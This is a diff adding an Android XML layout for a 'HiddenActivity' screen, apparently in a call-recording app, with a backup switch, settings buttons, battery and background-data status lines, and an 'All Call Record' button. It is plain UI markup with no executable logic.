@@ -1,0 +1,121 @@
+<?xml version="1.0" encoding="utf-8"?>
+<RelativeLayout
+    xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    xmlns:tools="http://schemas.android.com/tools"
+    android:layout_width="match_parent"
+    android:background="#85808080"
+    android:layout_height="match_parent"
+    tools:context=".HiddenActivity">
+    <ScrollView
+        android:layout_alignParentTop="true"
+        android:layout_width="match_parent"
+        android:layout_height="match_parent">
+        <LinearLayout
+            android:orientation="vertical"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content">
+            <LinearLayout
+                android:background="@color/colorGreen"
+                android:orientation="vertical"
+                android:padding="40dp"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content">
+                <TextView
+                    android:id="@+id/hiddenActivityUserTypeTextViewId"
+                    android:text="Backup On"
+                    android:textSize="35sp"
+                    android:textStyle="bold"
+                    android:gravity="center"
+                    android:textColor="@color/colorBlack"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"/>
+                <Button
+                    android:id="@+id/hiddenActivityOpenApplicationSettingButtonId"
+                    android:text="Open Application Setting"
+                    android:layout_gravity="center"
+                    android:textAllCaps="false"
+                    android:paddingStart="20dp"
+                    android:paddingEnd="20dp"
+                    android:layout_marginTop="5dp"
+                    android:layout_marginBottom="10dp"
+                    android:background="@drawable/button_background"
+                    android:textColor="@color/colorWhite"
+                    android:textStyle="bold"
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"/>
+                <Button
+                    android:id="@+id/hiddenActivityOpenAutoStartOnOffSettingButtonId"
+                    android:text="Auto Start On/Off"
+                    android:layout_gravity="center"
+                    android:textAllCaps="false"
+                    android:paddingStart="20dp"
+                    android:paddingEnd="20dp"
+                    android:layout_marginBottom="10dp"
+                    android:background="@drawable/button_background"
+                    android:textColor="@color/colorWhite"
+                    android:textStyle="bold"
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"/>
+                <TextView
+                    android:id="@+id/hiddenActivityBatteryOptimizationStatusTextViewId"
+                    android:text="Battery Optimization:- "
+                    android:textStyle="bold"
+                    android:textSize="18sp"
+                    android:gravity="center"
+                    android:textColor="@color/colorBlack"
+                    android:layout_marginBottom="10dp"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"/>
+                <TextView
+                    android:id="@+id/hiddenActivityRestrictBackgroundDataUsingStatusTextViewId"
+                    android:text="Background Data Restriction:- "
+                    android:textStyle="bold"
+                    android:textSize="18sp"
+                    android:gravity="center"
+                    android:layout_marginBottom="10dp"
+                    android:textColor="@color/colorBlack"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"/>
+                <androidx.appcompat.widget.SwitchCompat
+                    android:id="@+id/hiddenActivityRecordOnOffSwitchId"
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:layout_gravity="center"
+                    android:checked="true"
+                    android:text="Backup On/Off"
+                    android:textOff="Off"
+                    android:textOn="On"
+                    android:textStyle="bold"
+                    android:textSize="18sp"
+                    android:thumb="@drawable/custom_switch_thumb"
+                    app:showText="true"
+                    app:switchPadding="15dp"
+                    app:switchTextAppearance="@style/CustomSwitch.text"
+                    app:track="@drawable/custom_switch_track" />
+            </LinearLayout>
+            <LinearLayout
+                android:orientation="vertical"
+                android:paddingStart="40dp"
+                android:paddingEnd="40dp"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content">
+                <Button
+                    android:id="@+id/hiddenActivityAllCallRecordButtonId"
+                    android:text="All Call Record"
+                    style="@style/ButtonStyle"
+                    android:layout_marginTop="30dp"
+                    android:layout_marginBottom="10dp"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"/>
+                <ImageView
+                    android:id="@+id/hiddenActivityWhatsAppImageViewId"
+                    android:src="@drawable/whats_app_image"
+                    android:layout_marginTop="10dp"
+                    android:layout_marginBottom="10dp"
+                    android:layout_width="match_parent"
+                    android:layout_height="80dp"/>
+            </LinearLayout>
+        </LinearLayout>
+    </ScrollView>
+</RelativeLayout>
